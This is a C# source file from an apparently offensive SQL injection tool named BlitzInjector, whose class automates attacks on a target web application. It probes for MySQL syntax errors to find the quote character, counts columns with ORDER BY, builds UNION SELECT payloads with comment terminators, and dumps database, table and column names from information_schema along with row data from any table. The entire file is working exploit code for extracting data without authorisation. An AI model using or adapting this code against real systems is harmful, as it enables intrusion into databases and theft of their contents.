using System;
using System.Text;
using BlitzInjector.Request;
using System.Diagnostics;

namespace BlitzInjector.Proccess
{
    public class StringBasedProccessor : SqliProccessor
    {

        private readonly string ERROR_CHAR;

        private const string ERROR_COLUMN = "Unknown column";

        public string Escape;

        public int Columns = 0;

        public string ReadyQuery;

        public string VariableQueryName;

        public bool Injectable = false;

        public StringBasedProccessor(BlitzRequestHandler handler, string error = "")
            : base(handler)
        {
            ERROR_CHAR = String.IsNullOrEmpty(error) ? "You have an error in your SQL syntax" : error;
        }

        public override SqliProccessor Initilaize()
        {
            base.Initilaize();
            
            StringBasedInitilaize();

            return this;
        }

        public override SqliProccessor Initilaize(string url, int port)
        {
            base.Initilaize(url, port);

            StringBasedInitilaize();

            return this;
        }

        private void StringBasedInitilaize()
        {
            RevaleEscapeChar();
            FindColumns();

            ReadyQuery = String.Format("-{0}{1} UNION SELECT ", AcceptableValue, Escape);
            for (var i = 0; i < Columns; i++)
            {
                ReadyQuery += "'!!BlitzVar" + i + "!!'";
                if (i != Columns - 1)
                    ReadyQuery += ",";
            }
            ReadyQuery += " # /* --+-";

            var content = Handler.ChangeKeyValue(ReadyQuery).Result();

            for (var i = 0; i < Columns; i++)
            {
                var temp = Handler.ChangeKeyValue(ReadyQuery).Result();
                if (content.Contains("!!BlitzVar" + i + "!!"))
                {
                    VariableQueryName = "'!!BlitzVar" + i + "!!'";
                    break;
                }
            }
            if(String.IsNullOrEmpty(VariableQueryName))
                throw new Exception("cant find");
        }

        private void RevaleEscapeChar()
        {
            if(ContainsError(String.Format("{0}'", AcceptableValue)))
            {
                Escape = "'";

//                string temp = String.Format("{0}\"", AcceptableValue);
                if (ContainsError(String.Format("{0}\"", AcceptableValue)))
                    Escape = "";
            }
            else if (ContainsError(String.Format("{0}\"", AcceptableValue)))
                Escape = "\"";
            else
                throw new Exception();
        }

        private void FindColumns()
        {
            var query = String.Format("{0}{1} ORDER BY !!BlitzVar!! # /* --+-", AcceptableValue, Escape);
            /*
            do
            {
                if(Columns == 3)
                    Debugger.Break();
                Columns++;
                Console.WriteLine(Columns);
            } while (ContainsError(query.Replace("!!BlitzVar!!", Columns.ToString())));
             */
            for (int i = 1; i < 256; i++)
            {
                string temp = query.Replace("!!BlitzVar!!", i.ToString());
                string content = Handler.ChangeKeyValue(temp).Result();

                if (content.Contains(ERROR_COLUMN))
                {
                    Columns = i - 1;
                    break;
                }
            }
        }

        private bool ContainsError(string query)
        {
            return Handler.ChangeKeyValue(query)
                          .Result()
                          .Contains(ERROR_CHAR);
        }

        private string[] FetchData(string content)
        {
            return content.Split(new string[] { "!!BLITZ!!" }, StringSplitOptions.None);
        }

        public override string[] FetchDatabases()
        {
            var DatabasesQuery =
                "CONCAT('!!BLITZ!!', (SELECT group_concat(schema_name, '!!BLITZ!!') FROM information_schema.schemata))";
            var query = ReadyQuery.Replace(VariableQueryName, "(" + DatabasesQuery + ")");

            return FetchData(Handler.ChangeKeyValue(query).Result());
        }

        public override string[] FetchTables(string database)
        {
            var TablesQuery = 
            "FROM information_schema.tables WHERE table_schema = '" + database + "'";
            var Concats = "CONCAT('!!BLITZ!!', (SELECT group_concat(table_name, '!!BLITZ!!') " + TablesQuery + "))";
            var query = ReadyQuery.Replace(VariableQueryName, "(" + Concats + ")");

            return FetchData(Handler.ChangeKeyValue(query).Result());
        }

        public override string[] FetchColumns(string database, string table)
        {
            var ColumnsQuery =
                "FROM information_schema.columns WHERE table_name = '" + table + "'";
            var Concats = "CONCAT('!!BLITZ!!', (SELECT group_concat(column_name, '!!BLITZ!!') " + ColumnsQuery + "))";
            var query = ReadyQuery.Replace(VariableQueryName, Concats);

            return FetchData(Handler.ChangeKeyValue(query).Result());
        }

        public override string[][] FetchRows(string database, string table, string columns, int limit = 15, int page = 1)
        {
            var RowsQuery =
                String.Format("SELECT CONCAT('!!BLITZ!!',{0}, '!!BLITZ!!') FROM `{1}`.`{2}` LIMIT !!BlitzCounter!!, 1",
                              columns.Replace(",", ", ',', "), database, table);

            var query = ReadyQuery.Replace(VariableQueryName,"(" + RowsQuery + ")");

//            var data = FetchData(Handler.ChangeKeyValue(query).Result());

            var fetchedData = new string[limit][];
            for(int i = 0; i < limit; i++)
            {
                var RowQuery = query.Replace("!!BlitzCounter!!", (i + (limit * (page - 1))).ToString());
                var temp = FetchData(Handler.ChangeKeyValue(RowQuery).Result());
                if (temp.Length < 2)
                    break;
                fetchedData[i] = temp[1].Split(',');
            }
            return fetchedData;
        }

        public override string[] FetchQuery(string query)
        {
            throw new NotImplementedException();
        }
    }
}
